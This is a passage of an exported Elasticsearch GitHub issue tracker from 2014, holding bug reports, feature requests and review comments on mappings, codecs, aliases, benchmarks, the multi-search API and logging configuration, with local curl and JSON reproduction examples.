</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Enable merging of properties in the `_timestamp` field</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7614</link><project id="" key="" /><description>Updates on the _timestamp field were silently ignored.
Now _timestamp undergoes the same merge as regular
fields. This includes exceptions if a property cannot
be changed.
"path" and "default" cannot be changed.

closes #5772
closes #6958
partially fixes #777
</description><key id="42071399">7614</key><summary>Enable merging of properties in the `_timestamp` field</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-05T17:44:07Z</created><updated>2015-06-07T18:49:02Z</updated><resolved>2014-09-08T15:20:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-05T22:21:59Z" id="54689077">Looks fine.  I left some minor comments.
</comment><comment author="brwe" created="2014-09-08T15:00:22Z" id="54832616">Thanks for the review! Adressed all comments, ready for round two.
</comment><comment author="rjernst" created="2014-09-08T15:07:36Z" id="54834173">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Change LZFCompressedStreamOutput to use buffer recycler when allocating encoder</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7613</link><project id="" key="" /><description>It should be the same instance (thread local), but better to be safe.
</description><key id="42064075">7613</key><summary>Change LZFCompressedStreamOutput to use buffer recycler when allocating encoder</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>:Internal</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-05T16:24:58Z</created><updated>2015-06-07T12:05:55Z</updated><resolved>2014-09-05T20:59:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-09-05T16:42:14Z" id="54650215">Looks good, thanks for being more defensive here.
</comment><comment author="s1monw" created="2014-09-05T18:32:18Z" id="54663600">LGTM
</comment><comment author="kimchy" created="2014-09-05T20:55:35Z" id="54680300">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Marvel Sense - allow different themes on panels</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7612</link><project id="" key="" /><description>The original sense plugin had a light theme on the left hand coing panel, and a dark theme on the result right hand panel, currently marvel only lets you set a light or dark theme for both...suggestion is to allow setting themes on the individual panels
</description><key id="42045619">7612</key><summary>Marvel Sense - allow different themes on panels</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/simianhacker/following{/other_user}', u'events_url': u'https://api.github.com/users/simianhacker/events{/privacy}', u'organizations_url': u'https://api.github.com/users/simianhacker/orgs', u'url': u'https://api.github.com/users/simianhacker', u'gists_url': u'https://api.github.com/users/simianhacker/gists{/gist_id}', u'html_url': u'https://github.com/simianhacker', u'subscriptions_url': u'https://api.github.com/users/simianhacker/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/41702?v=4', u'repos_url': u'https://api.github.com/users/simianhacker/repos', u'received_events_url': u'https://api.github.com/users/simianhacker/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/simianhacker/starred{/owner}{/repo}', u'site_admin': False, u'login': u'simianhacker', u'type': u'User', u'id': 41702, u'followers_url': u'https://api.github.com/users/simianhacker/followers'}</assignee><reporter username="">Jrizzi1</reporter><labels /><created>2014-09-05T13:21:54Z</created><updated>2016-10-05T21:26:47Z</updated><resolved>2016-10-05T21:26:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-11-21T18:28:28Z" id="158670675">@simianhacker Does the new Marvel support light/dark theme?
</comment><comment author="eskibars" created="2016-10-05T21:26:46Z" id="251804562">Given that "Sense" is no more and has moved into Kibana as "dev tools," with a different look and feel, I'm going to close this out.  If it's needed, I recommend re-opening in the Kibana repo
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Wrong class name</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7611</link><project id="" key="" /><description>Was QFilterBuilders, should be FilterBuilders.
</description><key id="42033346">7611</key><summary>Wrong class name</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dmiszkiewicz</reporter><labels><label>docs</label></labels><created>2014-09-05T10:24:10Z</created><updated>2014-09-07T06:47:10Z</updated><resolved>2014-09-07T06:47:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T17:50:18Z" id="54722406">Hi @dominik223 

Thanks for the fix. Please could I ask you to sign our CLA so that I can get this merged in.
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="dmiszkiewicz" created="2014-09-06T22:00:26Z" id="54729846">Hi @clintongormley 
I sign my CLA.
</comment><comment author="clintongormley" created="2014-09-07T06:46:57Z" id="54739074">Thanks @dominik223 - merged
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Introduced a transient context to the rest request</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7610</link><project id="" key="" /><description>Similar to the one in `TransportMessage`. Added the `ContextHolder` base class where both `TransportMessage` and `RestRequest` derive from

Now next to the known headers, the context is always copied over from the rest request to the transport request (when the injected client is used)
</description><key id="42032014">7610</key><summary>Introduced a transient context to the rest request</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-05T10:04:34Z</created><updated>2015-06-07T12:06:06Z</updated><resolved>2014-09-05T16:12:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-05T15:19:17Z" id="54638887">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Check shard allocation periodically</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7609</link><project id="" key="" /><description>Shard allocation is currently only checked when something changes, eg a node is added or removed or an index is created or deleted.  This means that, eg, the disk based decider is only checked in these instances.

It would be nice to have a regular scheduled check instead.
</description><key id="42029793">7609</key><summary>Check shard allocation periodically</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">clintongormley</reporter><labels><label>adoptme</label></labels><created>2014-09-05T09:36:06Z</created><updated>2015-05-19T17:56:20Z</updated><resolved>2015-05-19T17:56:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-05-19T17:56:00Z" id="103614104">Closed by #8270
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Allow SingleNodeTest to reset the node if really needed after test.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7608</link><project id="" key="" /><description>This relates to #7550 I think we should at some point merge / refactor the annotations in the test cases ie. this is just a simple workaround...
</description><key id="42026168">7608</key><summary>Test: Allow SingleNodeTest to reset the node if really needed after test.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-05T08:47:39Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-09-05T19:25:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-05T19:21:30Z" id="54669515">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Ability to create aliases on tribe node</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7607</link><project id="" key="" /><description>Feature suggestion to allow aliases on a tribe node.

I often have two indexes, A and B. I want to be able to search across both as if they were a single index. So, I create an alias that points at both indexes.

However, if A and B are on different clusters, then it gets tricky. A tribe node allows me to search across both clusters, but I can't create an alias that points to both indexes. This would be useful as it would allow me to create specific filtering rules on the tribe node.

Note that ensuring the two indexes have the same name doesn't help either, because the tribe node will just run the search on one of them (not both at the same time).
</description><key id="42020289">7607</key><summary>Ability to create aliases on tribe node</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">tstibbs</reporter><labels><label>discuss</label></labels><created>2014-09-05T07:13:37Z</created><updated>2014-09-06T17:24:46Z</updated><resolved>2014-09-06T17:24:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T17:24:46Z" id="54721437">Hi @tstibbs 

I don't think this is possible.  The tribe node joins both clusters and merges their cluster state together, but this is read only.  You can't store an alias in a tribe node because it doesn't have its own cluster state, and it can't propagate that change to any of its clusters, or to any other tribe node.

This is a non-starter I'm afraid.  
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Index alias does not work if created at index creation time and using dynamic mappings</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7606</link><project id="" key="" /><description>Attached are 3 test cases (https://gist.github.com/ppf2/3ce59f1f1332bb41af46):
# TEST 1 (Dynamically mapped fields):  Create an index at index creation time.  Then add data.  You will see that the alias does not work.
# TEST 2 (Dynamically mapped fields):  Create an index with no alias defined.  Add data, then create the alias afterwards. You will see that the alias works this time.
# TEST 3 (Explicitly mapped fields):  Create an index at index creation time.  But this time, define an explicit mapping for the fields as well. Then add data.  You will see that the alias works this time.

If this is the expected behavior, can we include a disclaimer in the documentation (and ideally, catch this condition and throw and error to prevent the index alias from being created in the first place?)  
</description><key id="41998837">7606</key><summary>Index alias does not work if created at index creation time and using dynamic mappings</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels /><created>2014-09-04T23:49:00Z</created><updated>2014-09-06T17:19:53Z</updated><resolved>2014-09-06T17:19:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T17:19:53Z" id="54721259">Duplicate of #6664. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Force shards apart from one another</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7605</link><project id="" key="" /><description>This is kind of a rephrasing of #5748.  Here is the thing: no matter what I do with the balancer options I still sometimes see shards for my high traffic index being pushed together.  I _think_ this is because the balancer can make some hasty decisions when there are many unassigned shards.  Whatever the case I need this to not happen ever.  I want a way to say, "never ever ever ever put any two shards of this index on a machine.  Seriously, just leave the thing unassigned if you can't do it."  It'd be kind of like [total shards per node](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/index-modules-allocation.html#_total_shards_per_node) but on the index level.

I know I could crank up the "primary" balance option - in fact I already have it set like I described in #5748 but I still see the problem.  Sometimes its just a temporary thing - I bounce a node and things shift around and two end up together.  The problem is that under real load that'd be enough to cause the machine to enter an io thrashing death spiral.

So, yeah, I'm working to make this not so big a deal - do less IO and all that.  But this will give me piece of mind.

If this is something Elasticsearch would be willing to incorporate I'm happy to work on it.  Its more important to me than #7171 because it is a hard guarantee.  #7171 would still be useful. 
</description><key id="41995842">7605</key><summary>Force shards apart from one another</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">nik9000</reporter><labels /><created>2014-09-04T23:00:09Z</created><updated>2014-09-04T23:07:42Z</updated><resolved>2014-09-04T23:07:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-04T23:06:41Z" id="54558087">@nik9000 [index.routing.allocation.total_shards_per_node](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/index-modules-allocation.html#_total_shards_per_node) is already a per index setting. Doesn't that work for you?
</comment><comment author="nik9000" created="2014-09-04T23:07:42Z" id="54558175">@bleskes oh!  Yeah, that is exactly what I need then.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove unsupported `postings_format` / `doc_values_format`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7604</link><project id="" key="" /><description>Today ES allows you to pick e.g. "pulsing", but this is very dangerous because that format, and all other postings/doc values formats from the Lucene codecs module, has no backwards compatibility support in Lucene.  So on upgrade you can easily hit strange exceptions that make your index unusable / look like index corruption.

So I removed lucene-codecs JAR entirely from ES, which e.g. removes direct, simple text, memory PF, Lucene's BloomFilteringPF, and disk/memory DVF.

I haven't verified, but I think users can still put the Lucene codecs JAR onto ES's CLASSPATH (e.g. in with a plugin) and then use these formats in their own apps (at their own risk).  I think this extra step is better than the ease today with which users can select these formats that Lucene doesn't support.

Today ES allows you to pick e.g. "pulsing", but this is very dangerous because that format, and all other postings/doc values formats from the Lucene codecs module, has no backwards compatibility support in Lucene.  So on upgrade you can easily hit strange exceptions that make your index unusable / look like index corruption.

So I removed lucene-codecs JAR entirely from ES, which e.g. removes direct, simple text, memory PF, Lucene's BloomFilteringPF, and disk/memory DVF.

I haven't verified, but I think users can still put the Lucene codecs JAR onto ES's CLASSPATH (e.g. in with a plugin) and then use these formats in their own apps (at their own risk).  I think this extra step is better than the ease today with which users can select these formats that Lucene doesn't support.

See #7566 and #7238
</description><key id="41993505">7604</key><summary>Remove unsupported `postings_format` / `doc_values_format`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>:Mapping</label><label>breaking</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T22:28:57Z</created><updated>2015-06-06T16:24:23Z</updated><resolved>2014-09-08T09:03:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-04T22:51:15Z" id="54556738">+1
</comment><comment author="s1monw" created="2014-09-05T07:53:18Z" id="54595176">so how does this work with the reading part if somebody used one of the postings formats before? We removed the codecs JAR entirely will we be able to read old indices created with Lucene &lt; 4.8? I think that can be very tricky though - I am not sure if all the old postings formats and DV formats are in core? 
</comment><comment author="jpountz" created="2014-09-05T08:01:03Z" id="54595817">The codecs jar only contained experimental codecs for which lucene doesn't maintain backward compatibility, so I think it's fine? Users who happened to use one of these non-default codecs would need to either reindex or switch their indices to the defaut codec and trigger a merge before upgrading. All the old postings/dv formats are in core today (but will move to a module in 4.11 that we can add a dependency to when we upgrade to lucene 4.11 https://issues.apache.org/jira/browse/LUCENE-5858).
</comment><comment author="mikemccand" created="2014-09-05T09:21:21Z" id="54602753">Right, users who use the default (back compat supported) codecs will be fine: those are in core (moving to separate JAR in 5.0).  But non-back-compat codecs (e.g. bloom_pulsing, pulsing) won't be recognized anymore, which I think is OK?  (Better than the "false corruption" we saw on #7238 ).

&gt; either reindex or switch their indices to the defaut codec and trigger a merge before upgrading. 

Hmm do we allow changing the postings_format / doc_values_format in the mapping for a field after it's created?  Or is that "write once"?
</comment><comment author="s1monw" created="2014-09-05T09:23:00Z" id="54602892">&gt; Hmm do we allow changing the postings_format / doc_values_format in the mapping for a field after it's created? Or is that "write once"?

you can change it via the update mapping API
</comment><comment author="jpountz" created="2014-09-05T09:23:01Z" id="54602895">&gt; Hmm do we allow changing the postings_format / doc_values_format in the mapping for a field after it's created? Or is that "write once"?

It can be updated, see `AbstractFieldMapper.merge`.
</comment><comment author="mikemccand" created="2014-09-05T12:57:27Z" id="54621220">&gt; you can change it via the update mapping API
&gt; 
&gt; It can be updated, see AbstractFieldMapper.merge.

OK that's great, so there is a migration path.
</comment><comment author="s1monw" created="2014-09-05T18:33:39Z" id="54663758">++ just double checking...
</comment><comment author="s1monw" created="2014-09-05T18:34:01Z" id="54663790">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>has_child query support for score_mode "min" </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7603</link><project id="" key="" /><description>As described in http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-has-child-query.html there are currently the following score_modes available max, sum, avg or none. 

It would be cool if a score_mode "min" would be implemented which returns the lowest value greater than 0. This would be useful if you would like to sort products on the min price of there product variants.

E.g.:
{
    index: "sample",
    type: "articlegroup",
    body: {
        size: 20,
        from: 0,
        query: {
            has_child: {
                type: "product",
                score_mode: "min",
                query: {
                    function_score: {
                        filter: {
                            bool: {
                                must: [
                                    {
                                        exists: {
                                            field: "product.price.sortiment2"
                                        }
                                    }
                                ]
                            }
                        },
                        functions: [
                            {
                                script_score: {
                                    script: "doc['product.price.sortiment2'].value"
                                }
                            }
                        ]
                    }
                }
            }
        }
    }
}
</description><key id="41992484">7603</key><summary>has_child query support for score_mode "min" </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ckogler</reporter><labels><label>adoptme</label></labels><created>2014-09-04T22:17:57Z</created><updated>2014-10-15T14:28:23Z</updated><resolved>2014-10-15T14:28:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Benchmarks: Re-factored benchmark infra</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7602</link><project id="" key="" /><description>Major re-factoring to use a dual-channel strategy for executing
benchmarks. Uses cluster metadata for managing lifecycle events, but
transport channel to send benchmark definitions and results between
master and executor nodes.

This commit also adds:
- Wildcard requests for pause/resume/abort.
- Fixes transport request ACTION string to conform to security naming
  conventions.
- Fixed bug that incorrectly calculated total requested iterations in
  cases where summary computation was called more than once.
- Rename field 'total_completed_queries' for better readability.
- Clear values for slowest when re-calculating summary results.
- Simplified use of barriers and semaphores in testing logic to allow
  suspending benchmark execution for testing various states.
- Handle cases where executor nodes drop from the cluster during
  execution.
</description><key id="41992385">7602</key><summary>Benchmarks: Re-factored benchmark infra</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">aleph-zero</reporter><labels><label>:Benchmark</label><label>feature</label><label>stalled</label></labels><created>2014-09-04T22:16:41Z</created><updated>2015-09-11T09:23:29Z</updated><resolved>2015-09-11T09:23:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-09-24T08:24:38Z" id="56639283">A slight variation of the same failing scenario:
- start node with -Des.node.bench=false as a master on port 9200
- start node with -Des.node.bench=true as a master on port 9201
- start benchmark by sending it to port 9201

```
curl -XPUT 'localhost:9201/_bench/_submit?pretty=true' -d '{
    "name": "my_benchmark",
    "competitors": [ {
        "name": "my_competitor",
        "requests": [ {
            "query": {
                "match": { "_all": "a*" }
            }
        } ]
    } ]
}'
```
- while this benchmark is running, kill node running on port 9200 using `kill -9`
- run `curl 'localhost:9201/_bench/_status?pretty'` notice that `my_benchmark` is now stuck with `COMPLETED` status in cluster state.
- run `curl -XPOST 'localhost:9201/_bench/_abort/my_benchmark?pretty'` - it never returns, and you can see in the log files on the server message like this:

```
org.elasticsearch.ElasticsearchIllegalStateException: benchmark [my_benchmark]: missing internal state
    at org.elasticsearch.action.benchmark.BenchmarkCoordinatorService$5.onResponse(BenchmarkCoordinatorService.java:355)
    at org.elasticsearch.action.benchmark.BenchmarkCoordinatorService$5.onResponse(BenchmarkCoordinatorService.java:341)
    at org.elasticsearch.action.benchmark.BenchmarkStateManager$UpdateTask.clusterStateProcessed(BenchmarkStateManager.java:172)
    at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:466)
    at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:153)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:724)
```
</comment><comment author="javanna" created="2015-03-20T10:35:56Z" id="83983216">Waiting for #6914, marked as stalled
</comment><comment author="jpountz" created="2015-09-11T09:23:29Z" id="139497965">This PR is already hard to merge due to recent changes, and this won't get better until #6914 is in. Closing: we will have to do things from scratch again anyway.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>multi search REST API endpoint is sensitive to trailing new line</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7601</link><project id="" key="" /><description>Consider the following multi-search request body:

``` json
{"index":"articles","type":"article"}
{"query":{"match_all":{}},"size":1}
{"index":"people","type":"person"}
{"query":{"match_all":{}},"size":1}
```

If it includes a new line at the end, there will be 2 results returned but if it does not, there will be only 1.

While it is not a major issue, it is fairly counter-intuitive and just took a good couple of hours of my time.
</description><key id="41985043">7601</key><summary>multi search REST API endpoint is sensitive to trailing new line</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">michaelklishin</reporter><labels><label>:REST</label><label>adoptme</label><label>low hanging fruit</label><label>PITA</label></labels><created>2014-09-04T20:59:11Z</created><updated>2016-09-14T11:22:31Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-05T07:30:06Z" id="54593495">This is actually by design but we might either throw an error if you don't have the newline or if there are pending characters in the json stream or support requests without whitespaces.... I will mark the issue accordingly - I can totally see how this can be a timesink!
</comment><comment author="clintongormley" created="2014-09-06T17:27:15Z" id="54721532">We should do the same for the bulk API and  mpercolate, 
</comment><comment author="michaelklishin" created="2014-09-06T18:36:52Z" id="54723933">@s1monw @clintongormley what if ES would add a new line to the JSON body before attempting to parse? As far as I understand, an empty trailing new line should do no harm.

I'd be up for working on a pull request if you like the idea.
</comment><comment author="clintongormley" created="2014-09-06T18:51:31Z" id="54724365">&gt; what if ES would add a new line to the JSON body before attempting to parse? As far as I understand, an empty trailing new line should do no harm.

It could hide the fact that the request has been truncated incorrectly. I think the solution here is to complain with a meaningful error message if these bulk requests do not end with `\n`

&gt; I'd be up for working on a pull request if you like the idea.

 Yes, a PR would be gratefully accepted :)
</comment><comment author="s1monw" created="2014-11-21T10:02:36Z" id="63949273">@michaelklishin any news on the PR you wanted to work on? maybe I just missed it?
</comment><comment author="michaelklishin" created="2014-11-21T11:26:01Z" id="63958031">@s1monw not sure how soon I can get to this. What's the decision: to respond with an error if bulk request body doesn't end in a new line?
</comment><comment author="clintongormley" created="2014-11-24T18:42:29Z" id="64241859">@michaelklishin yes - to at least make it easy for users to figure out what is going wrong.
</comment><comment author="pvgoddijn" created="2016-09-14T11:21:25Z" id="246982403">i just found this bug due to a related 'error'

When doing a bulk update with precisely one record (without the trailing newline), a error is thrown.
(not very clear this is about a missing newline but it is)

`{"error":{"root_cause":[{"type":"action_request_validation_exception","reason":"Validation Failed: 1: no requests added;"}],"type":"action_request_validation_exception","reason":"Validation Failed: 1: no requests added;"},"status":400}`

This made me realize i was not indexing the final document of my batch updates.

I think the current situation is dangerously misleading and either a warning should be thrown or a newline should be 'assumed' on the end of the input.

Coming from the (Java) RestClient side of this issue i would prefer the assumption of newlines because the JacksonObjectMapper doesnt support adding a newline after every root object, but does support a 'RootValueSeparator' (which is why i fell into this trap and i would assume more Java users will  / would)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Lowercase tokenizer on number strings return no tokens</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7600</link><project id="" key="" /><description>Lowercase tokenizer against "number" strings returns no tokens.  Even though it does not make sense to lowercase numbers in a string, it would be nice for the tokenizer to return the original string instead of no tokens at all ?

``` json
DELETE test
PUT test
{
  "settings": {
    "analysis": {
      "analyzer": {
        "lowerCase": {
          "type": "custom",
          "filter": [
            "standard"
          ],
          "tokenizer": "lowercase"
        }
      }
    }
  },
  "mappings": {
    "type": {
      "properties": {
        "customer_id": {
          "type": "string",
          "analyzer": "lowerCase"
        }
      }
    }
  }
}

GET /test/_analyze?analyzer=lowerCase&amp;text=01312
```
</description><key id="41980717">7600</key><summary>Lowercase tokenizer on number strings return no tokens</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels /><created>2014-09-04T20:21:24Z</created><updated>2014-09-06T17:15:48Z</updated><resolved>2014-09-06T17:15:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T17:15:48Z" id="54721116">Hi @ppf2 

This is working as documented -- it combines lowercasing with the `letter` tokenizer.  See http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/analysis-lowercase-tokenizer.html#analysis-lowercase-tokenizer

Perhaps you want the whitespace tokenizer or pattern tokenizer, combined with the lowercase token filter instead.

Personally I don't find the `lowercase` tokenizer useful at all, and I think we should probably deprecate it.  
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make ${node.name} available in logging.yml</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7599</link><project id="" key="" /><description>Some configuration variables are available in `logging.yml` but not all. The current log file name looks like this.

```
file: ${path.logs}/${cluster.name}.log
```

It would be really helpful to have `${node.name}` available in `logging.yml` so you could write to a file name like this.

```
file: ${path.logs}/${cluster.name}-${node.name}.log
```

That way it has unique log names if you write multiple node's logs to a single folder like `/logs`.
</description><key id="41976480">7599</key><summary>Make ${node.name} available in logging.yml</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">erikringsmuth</reporter><labels><label>discuss</label></labels><created>2014-09-04T19:37:00Z</created><updated>2014-11-07T11:13:49Z</updated><resolved>2014-11-07T11:13:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="tmkujala" created="2014-09-10T15:32:16Z" id="55133396">We're using `${node.name}` in `logging.yml` successfully today on 0.90.13...not sure if something changed in the 1.x branch?
</comment><comment author="erikringsmuth" created="2014-09-10T17:10:27Z" id="55148210">I just tried downloading 0.9.13, switched the first log name to `${path.logs}/${cluster.name}-${node.name}.log`, and ran it with `bin\elasticsearch` and got the same error.

http://www.elasticsearch.org/downloads/0-90-13/

```
Failed to configure logging...
java.lang.IllegalArgumentException: Could not resolve placeholder 'node.name'
        at org.elasticsearch.common.property.PropertyPlaceholder.parseStringValue(PropertyPlaceholder.java:124)
        at org.elasticsearch.common.property.PropertyPlaceholder.replacePlaceholders(PropertyPlaceholder.java:81)
        at org.elasticsearch.common.settings.ImmutableSettings$Builder.replacePropertyPlaceholders(ImmutableSettings.jav
a:899)
        at org.elasticsearch.common.logging.log4j.LogConfigurator.configure(LogConfigurator.java:92)
        at org.elasticsearch.bootstrap.Bootstrap.setupLogging(Bootstrap.java:92)
        at org.elasticsearch.bootstrap.Bootstrap.main(Bootstrap.java:176)
        at org.elasticsearch.bootstrap.ElasticSearch.main(ElasticSearch.java:32)
log4j:WARN No appenders could be found for logger (node).
log4j:WARN Please initialize the log4j system properly.
log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info.
```
</comment><comment author="tmkujala" created="2014-09-10T17:15:07Z" id="55149004">@erikringsmuth so it appears that if you explicitly set `node.name` in your configuration, you're able to use it in the logging config as expected. If you let it be auto-generated, that exception is thrown.
</comment><comment author="erikringsmuth" created="2014-09-10T17:54:40Z" id="55154844">Ah, your right. That solves half the problem right there. Now I'm curious why the auto-generated names don't work.

Here's my use case. My company wants an elasticsearch ZIP bundled with some of the common elasticsearch plugins and some of the configuration preset including the logging file names. The goal is to have the bundle work in production and locally if you want to run it on your own computer. In production I will be configuring the node.name in elasticsearch.yml so that would work but I don't want to preset the name for people running it locally.

It looks like it already partially supports it. It just needs a fix to pick up the auto-generated name.
